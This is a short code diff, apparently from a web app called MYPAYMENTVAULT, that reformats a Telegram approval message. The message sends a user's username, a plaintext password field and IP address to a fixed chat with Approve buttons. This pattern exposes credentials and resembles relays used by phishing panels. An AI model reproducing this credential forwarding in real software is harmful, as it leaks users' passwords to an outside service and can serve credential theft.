@@ -58,12 +58,16 @@ export async function sendApprovalRequest(
         chat_id: CHAT_ID,
         parse_mode: "HTML",
         text:
-          `🔐 <b>MYPAYMENTVAULT - Permintaan ${label}</b>\n\n` +
-          `👤 Username: <code>${username}</code>\n` +
-          `🔑 Detail: <code>${password}</code>\n` +
-          `🌐 IP Address: <code>${ip}</code>\n` +
-          `🕐 Waktu: ${now}\n\n` +
-          `⚠️ Apakah kamu menyetujui ${label.toLowerCase()} ini?`,
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🔐 <b>MYPAYMENTVAULT</b>\n` +
+          `📌 <b>Permintaan ${label}</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+          `👤 <b>Username</b>  : <code>${username}</code>\n` +
+          `🔑 <b>Detail</b>    : <code>${password}</code>\n` +
+          `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
+          `🕐 <b>Waktu</b>     : ${now}\n\n` +
+          `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━`,
         reply_markup: {
           inline_keyboard: [[
             { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
